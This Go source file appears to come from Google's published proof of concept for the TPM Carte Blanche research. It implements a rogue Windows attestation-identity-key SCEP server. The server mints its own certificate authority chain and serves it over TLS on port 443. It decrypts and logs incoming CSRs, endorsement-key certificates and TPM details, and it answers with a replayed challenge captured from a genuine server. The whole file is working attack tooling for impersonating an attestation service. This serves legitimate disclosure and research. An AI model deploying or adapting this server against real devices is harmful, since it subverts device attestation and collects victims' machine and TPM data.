package main

import (
	"bytes"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/asn1"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"io/ioutil"
	"net/http"
	"os"
	"path"
	"time"

	"github.com/chrisfenner/pkcs7"
	"github.com/google/security-research/pocs/bios/tpm-carte-blanche/lib/akscep"
)

var (
	root, ca, ras, rae, ssl                     crypto.PrivateKey
	rootCert, caCert, rasCert, raeCert, sslCert *x509.Certificate
	keysDir                                     = "aksrvCerts"
	dataDir                                     = "aksrvData"
	ekChallengeFile                             = "sampledata/attestationKeyChallenge"
)

func rootCertPath() string {
	return path.Join(keysDir, "root.crt")
}

func rootKeyPath() string {
	return path.Join(keysDir, "root.key")
}

func caCertPath() string {
	return path.Join(keysDir, "ca.crt")
}

func caKeyPath() string {
	return path.Join(keysDir, "ca.key")
}

func raSigningCertPath() string {
	return path.Join(keysDir, "raSigning.crt")
}

func raSigningKeyPath() string {
	return path.Join(keysDir, "raSigning.key")
}

func raEncryptionCertPath() string {
	return path.Join(keysDir, "raEncryption.crt")
}

func raEncryptionKeyPath() string {
	return path.Join(keysDir, "raEncryption.key")
}

func sslKeyPath() string {
	return path.Join(keysDir, "ssl.key")
}

func sslCertPath() string {
	return path.Join(keysDir, "ssl.crt")
}

func writePem(data []byte, typ, path string) error {
	file, err := os.Create(path)
	if err != nil {
		return err
	}
	defer file.Close()
	return pem.Encode(file, &pem.Block{
		Type:  typ,
		Bytes: data,
	})
}

func makeKeys() error {
	err := os.Mkdir(keysDir, 0755)

	newRoot, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return err
	}
	newCA, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return err
	}
	newRAS, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return err
	}
	newRAE, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return err
	}
	newSSL, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return err
	}

	newRootBytes, err := x509.MarshalPKCS8PrivateKey(newRoot)
	if err != nil {
		return err
	}
	newCABytes, err := x509.MarshalPKCS8PrivateKey(newCA)
	if err != nil {
		return err
	}
	newRASBytes, err := x509.MarshalPKCS8PrivateKey(newRAS)
	if err != nil {
		return err
	}
	newRAEBytes, err := x509.MarshalPKCS8PrivateKey(newRAE)
	if err != nil {
		return err
	}
	newSSLBytes, err := x509.MarshalPKCS8PrivateKey(newSSL)
	if err != nil {
		return err
	}

	newRootCert, newRootCertBytes, err := akscep.MakeRootCert(newRoot.Public(), newRoot)
	if err != nil {
		return err
	}
	newCACert, newCACertBytes, err := akscep.MakeCACert(newCA.Public(), newRoot, newRootCert)
	if err != nil {
		return err
	}
	newRASCert, newRASCertBytes, err := akscep.MakeRASigningCert(newRAS.Public(), newCA, newCACert)
	if err != nil {
		return err
	}
	newRAECert, newRAECertBytes, err := akscep.MakeRAEncryptionCert(newRAE.Public(), newCA, newCACert)
	if err != nil {
		return err
	}
	newSSLCert, newSSLCertBytes, err := akscep.MakeSSLCert(newSSL.Public(), newSSL)
	if err != nil {
		return err
	}

	if err := writePem(newRootBytes, "PRIVATE KEY", rootKeyPath()); err != nil {
		return err
	}
	if err := writePem(newCABytes, "PRIVATE KEY", caKeyPath()); err != nil {
		return err
	}
	if err := writePem(newRASBytes, "PRIVATE KEY", raSigningKeyPath()); err != nil {
		return err
	}
	if err := writePem(newRAEBytes, "PRIVATE KEY", raEncryptionKeyPath()); err != nil {
		return err
	}
	if err := writePem(newSSLBytes, "PRIVATE KEY", sslKeyPath()); err != nil {
		return err
	}

	if err := writePem(newRootCertBytes, "CERTIFICATE", rootCertPath()); err != nil {
		return err
	}
	if err := writePem(newCACertBytes, "CERTIFICATE", caCertPath()); err != nil {
		return err
	}
	if err := writePem(newRASCertBytes, "CERTIFICATE", raSigningCertPath()); err != nil {
		return err
	}
	if err := writePem(newRAECertBytes, "CERTIFICATE", raEncryptionCertPath()); err != nil {
		return err
	}
	if err := writePem(newSSLCertBytes, "CERTIFICATE", sslCertPath()); err != nil {
		return err
	}

	root = newRoot
	rootCert = newRootCert
	ca = newCA
	caCert = newCACert
	ras = newRAS
	rasCert = newRASCert
	rae = newRAE
	raeCert = newRAECert
	ssl = newSSL
	sslCert = newSSLCert
	return nil
}

func loadKey(path string, key *crypto.PrivateKey) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	block, rest := pem.Decode(data)
	if block == nil {
		return fmt.Errorf("no PEM data in %s", path)
	}
	if len(rest) != 0 {
		return fmt.Errorf("unexpected extra data in %s", path)
	}
	if block.Type != "PRIVATE KEY" {
		return fmt.Errorf("want PRIVATE KEY but got %s reading %s", block.Type, path)
	}
	parsedKey, err := x509.ParsePKCS8PrivateKey(block.Bytes)
	if err != nil {
		return err
	}
	privateKey, ok := parsedKey.(crypto.PrivateKey)
	if !ok {
		return fmt.Errorf("didn't get crypto.PrivateKey parsing %s: %+v", path, key)
	}
	*key = privateKey
	return nil
}

func loadCert(path string, cert **x509.Certificate) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	block, rest := pem.Decode(data)
	if block == nil {
		return fmt.Errorf("no PEM data in %s", path)
	}
	if len(rest) != 0 {
		return fmt.Errorf("unexpected extra data in %s", path)
	}
	if block.Type != "CERTIFICATE" {
		return fmt.Errorf("want CERTIFICATE but got %s reading %s", block.Type, path)
	}
	parsedCert, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return err
	}
	*cert = parsedCert
	return nil
}

func loadKeys() error {
	if err := loadKey(rootKeyPath(), &root); err != nil {
		return err
	}
	if err := loadKey(caKeyPath(), &ca); err != nil {
		return err
	}
	if err := loadKey(raSigningKeyPath(), &ras); err != nil {
		return err
	}
	if err := loadKey(raEncryptionKeyPath(), &rae); err != nil {
		return err
	}
	if err := loadKey(sslKeyPath(), &ssl); err != nil {
		return err
	}
	if err := loadCert(rootCertPath(), &rootCert); err != nil {
		return err
	}
	if err := loadCert(caCertPath(), &caCert); err != nil {
		return err
	}
	if err := loadCert(raSigningCertPath(), &rasCert); err != nil {
		return err
	}
	if err := loadCert(raEncryptionCertPath(), &raeCert); err != nil {
		return err
	}
	if err := loadCert(sslCertPath(), &sslCert); err != nil {
		return err
	}
	return nil
}

func loadOrCreateKeys() error {
	fmt.Printf("Initializing server keys...\n")
	if err := loadKeys(); err != nil {
		var pathErr *fs.PathError
		if !errors.As(err, &pathErr) {
			return err
		}
		fmt.Printf("Generating new keys...\n")
		if err := makeKeys(); err != nil {
			return err
		}
		fmt.Printf("Finished generating new keys.\n")
	}
	fmt.Printf("Finished initializing server keys.\n")
	return nil
}

func dumpToFile(tag string, data []byte, name string) error {
	filename := path.Join(dataDir, name+"-"+tag)
	if err := ioutil.WriteFile(filename, data, 0644); err != nil {
		return err
	}
	fmt.Printf("Wrote %d bytes to %s.\n", len(data), filename)
	return nil
}

func main() {
	os.Exit(mainWithExit())
}

func mainWithExit() int {
	if err := loadOrCreateKeys(); err != nil {
		fmt.Fprintf(os.Stderr, "Error initializing keys: %s\n", err.Error())
		return -1
	}
	http.HandleFunc("/templates/Aik/scep", scep)
	fmt.Printf("Running AIK server on port 443, use Ctrl-C to cancel.\n")
	if err := http.ListenAndServeTLS(":443", sslCertPath(), sslKeyPath(), nil); err != nil {
		fmt.Fprintf(os.Stderr, "Error serving HTTPS: %s\n", err.Error())
		return -1
	}
	return 0
}

func scep(w http.ResponseWriter, req *http.Request) {
	operation := req.URL.Query()["operation"]
	if len(operation) == 0 {
		fmt.Fprintf(os.Stderr, "got a bad request with no operation")
		http.Error(w, "internal error", 400)
		return
	}
	switch operation[0] {
	case "GetCACaps":
		getCACaps(w, req)
		return
	case "GetCACertChain":
		getCACerts(w, req)
		return
	case "PKIOperation":
		pkiOperation(w, req)
		return
	}
	fmt.Fprintf(os.Stderr, "unrecognized operation '%s'\n", operation[0])
	http.Error(w, "unsupported", 400)
}

func assembleCACerts() ([]byte, error) {
	env, err := pkcs7.NewSignedData([]byte{})
	if err != nil {
		return nil, err
	}
	env.AddCertificate(rootCert)
	env.SignWithoutAttr(caCert, ca, pkcs7.SignerInfoConfig{})
	env.AddCertificate(rasCert)
	env.AddCertificate(raeCert)
	env.RemoveAuthenticatedAttributes()
	return env.Finish()
}

func getCACaps(w http.ResponseWriter, req *http.Request) {
	fmt.Printf("Got %s on GetCACaps from %s\n", req.Method, req.RemoteAddr)
	rsp := []byte(`SHA-256
SHA-1
AES256
AES128
DES3
POSTPKIOperation
IdentityKeyAttestation
GetCaCertChain` + "\r\n")
	if req.Method != "GET" {
		http.Error(w, "expected GET", 400)
		return
	}

	io.Copy(w, bytes.NewReader(rsp))
}

func getCACerts(w http.ResponseWriter, req *http.Request) {
	fmt.Printf("Got %s on GetCACertChain from %s\n", req.Method, req.RemoteAddr)
	if req.Method != "GET" {
		http.Error(w, "expected GET", 400)
		return
	}

	rsp, err := assembleCACerts()
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not create pkcs7 for GetCACerts response\n")
		http.Error(w, "internal error", 500)
		return
	}

	io.Copy(w, bytes.NewReader(rsp))
}

func randomTag() string {
	tag := make([]byte, 4)
	rand.Reader.Read(tag)
	return hex.EncodeToString(tag)
}

type senderNonce struct {
	Nonce []byte
}

func getSenderNonce(p *pkcs7.PKCS7) ([]byte, error) {
	var nonce []byte
	if err := p.UnmarshalSignedAttribute(asn1.ObjectIdentifier{2, 16, 840, 1, 113733, 1, 9, 5}, &nonce); err != nil {
		return nil, err
	}
	return nonce, nil
	/*var nonce senderNonce
	if rest, err := asn1.UnmarshalWithParams(nonceRaw.FullBytes, &nonce, "set"); err != nil {
		return nil, err
	} else if len(rest) != 0 {
		return nil, fmt.Errorf("extra data unparsed: %v", rest)
	}
	return nonce.Nonce, nil*/
}

type transactionID struct {
	TransactionID string
}

func getTransactionID(p *pkcs7.PKCS7) (string, error) {
	var id string
	if err := p.UnmarshalSignedAttribute(asn1.ObjectIdentifier{2, 16, 840, 1, 113733, 1, 9, 7}, &id); err != nil {
		return "", err
	}
	return id, nil
	/*var id transactionID
	if rest, err := asn1.UnmarshalWithParams(idRaw.FullBytes, &id, "set"); err != nil {
		return "", err
	} else if len(rest) != 0 {
		return "", fmt.Errorf("extra data unparsed: %v", rest)
	}
	return id.TransactionID, nil*/
}

func pkiOperation(w http.ResponseWriter, req *http.Request) {
	tag := randomTag()
	os.Mkdir(dataDir, 0755)
	fmt.Printf("Got %s (%s bytes) on PKIOperation from %s\n", req.Method, req.Header["Content-Length"], req.RemoteAddr)
	if req.Method != "POST" {
		http.Error(w, "expected POST", 400)
		return
	}

	var buf bytes.Buffer
	buf.ReadFrom(req.Body)
	if err := dumpToFile(tag, buf.Bytes(), "1_pkcs7S"); err != nil {
		fmt.Fprintf(os.Stderr, "temp file error: %v", err)
		http.Error(w, "internal error", 500)
		return
	}

	env, err := akscep.ParseGetChallengeReq(buf.Bytes())
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not parse pkcs7 for scep: %v\n", err)
		http.Error(w, "internal error", 500)
		return
	}
	if err := dumpToFile(tag, env.Envelope.Content, "2_pkcs7E"); err != nil {
		fmt.Fprintf(os.Stderr, "temp file error: %v", err)
		http.Error(w, "internal error", 500)
		return
	}

	scepCert := env.SCEPCert()
	if err := dumpToFile(tag, scepCert.Raw, "0_scepCert"); err != nil {
		fmt.Fprintf(os.Stderr, "temp file error: %v", err)
		http.Error(w, "internal error", 500)
		return
	}

	data, err := env.Contents.Decrypt(raeCert, rae)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not decrypt pkcs7 for scep: %v\n", err)
		http.Error(w, "internal error", 500)
		return
	}
	if err := dumpToFile(tag, data, "3_csr"); err != nil {
		fmt.Fprintf(os.Stderr, "temp file error: %v", err)
		http.Error(w, "internal error", 500)
		return
	}

	csr, err := akscep.ParseAttestationKeyCSR(data, scepCert)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not parse client CSR: %v\n", err)
		http.Error(w, "internal error", 500)
		return
	}

	fmt.Printf(`Received AIK request from %s on %s (running Windows %s):
	Subject Key ID: %x
	SCEP Signer Hash: %x
	TPM Manufacturer: %s
	TPM Model: %s
	TPM Version: %x
`,
		csr.UserName, csr.MachineName, csr.OSVersion, csr.SubjectKeyID, csr.SCEPSignerHash,
		string(csr.TPMInfo.Manufacturer), csr.TPMInfo.Model, csr.TPMInfo.Version)

	claimsData, err := akscep.GenerateAttestationStatement(&csr.AttestationStatement)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not parse client CSR's attestation statement: %v\n", err)
		http.Error(w, "internal error", 500)
		return
	}
	if err := dumpToFile(tag, claimsData, "4a_attestation"); err != nil {
		fmt.Fprintf(os.Stderr, "temp file error: %v", err)
		http.Error(w, "internal error", 500)
		return
	}

	ek, err := pkcs7.Parse(csr.EncryptedEKCerts)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not parse client CSR's EK certs PKCS7: %v\n", err)
		http.Error(w, "internal error", 500)
		return
	}

	ekData, err := ek.Decrypt(raeCert, rae)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not decrypt pkcs7 with EK certs: %v\n", err)
		http.Error(w, "internal error", 500)
		return
	}

	if err := dumpToFile(tag, ekData, "4b_ek"); err != nil {
		fmt.Fprintf(os.Stderr, "temp file error: %v", err)
		http.Error(w, "internal error", 500)
		return
	}

	// Fetch some live values from the request that the client will expect to see again
	senderNonce, err := getSenderNonce(env.Envelope)
	if err != nil {
		fmt.Fprintf(os.Stderr, "couldn't get sender nonce: %v", err)
		http.Error(w, "internal error", 500)
		return
	}

	transID, err := getTransactionID(env.Envelope)
	if err != nil {
		fmt.Fprintf(os.Stderr, "couldn't get transaction ID: %v", err)
		http.Error(w, "internal error", 500)
		return
	}

	// Just return the captured response from the real server, assuming it's still good for
	// the real client.
	challenge, err := ioutil.ReadFile(ekChallengeFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not read EK challenge file: %v\n", err)
		http.Error(w, "internal error", 500)
		return
	}

	builder := akscep.GetChallengeRspBuilder{
		Challenge:     challenge,
		SenderNonce:   senderNonce,
		TransactionID: transID,
		SignerCert:    rasCert,
		SignerKey:     ras,
		RecipientCert: scepCert,
	}
	rsp, err := builder.Build()
	if err != nil {
		fmt.Fprintf(os.Stderr, "could not generate EK challenge packet: %v\n", err)
		http.Error(w, "internal error", 500)
		return
	}
	if err := dumpToFile(tag, rsp, "5_challenge_rsp"); err != nil {
		fmt.Fprintf(os.Stderr, "temp file error: %v", err)
		http.Error(w, "internal error", 500)
		return
	}

	w.Header().Add("Content-Type", "application/x-pki-message")
	http.ServeContent(w, req, "coolresponse", time.Now(), bytes.NewReader(rsp))
	fmt.Printf("Responded to request with %d bytes of EK challenge.\n", len(rsp))
	return
}
